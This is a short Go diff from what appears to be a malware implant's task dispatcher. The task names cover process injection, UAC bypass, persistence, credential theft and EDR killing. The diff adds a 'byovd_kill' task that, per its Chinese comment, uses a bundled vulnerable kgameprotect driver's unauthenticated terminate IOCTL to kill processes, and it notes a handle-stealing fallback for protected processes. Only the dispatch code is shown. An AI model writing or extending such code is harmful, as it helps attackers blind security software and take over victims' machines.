@@ -971,7 +971,7 @@ func isHeavyTask(taskType string) bool {
 		"bof_load", "plugin_exe", "plugin_dll", "plugin_shellcode",
 		"fileless_exec", "process_inject", "process_spoof", "auto_inject",
 		"injection", "spawn", "uac_bypass", "persistence", "credentials",
-		"edr_blind", "edr_kill", "byovd_load", "byovd_unload", "ppl_kill",
+		"edr_blind", "edr_kill", "byovd_load", "byovd_unload", "byovd_kill", "ppl_kill",
 		"av_detect":
 		return true
 	default:
@@ -1676,8 +1676,11 @@ func executeTask(task Task) Result {
 	case "byovd_unload":
 		// BYOVD：卸载驱动
 		output, exitCode, errMsg = handleBYOVDUnload(task.Data)
+	case "byovd_kill":
+		// BYOVD：用内置 kgameprotect 驱动的无鉴权终止 IOCTL 击杀进程（按 PID 或进程名）
+		output, exitCode, errMsg = handleBYOVDKill(task.Data)
 	case "ppl_kill":
-		// PPL 击杀：直接终止 + 驱动清除保护
+		// PPL 击杀：直接终止失败后走句柄窃取（内置驱动无内核读写，不能改 EPROCESS.Protection）
 		output, exitCode, errMsg = handlePPLKill(task.Data)
 
 	case "sysinfo":
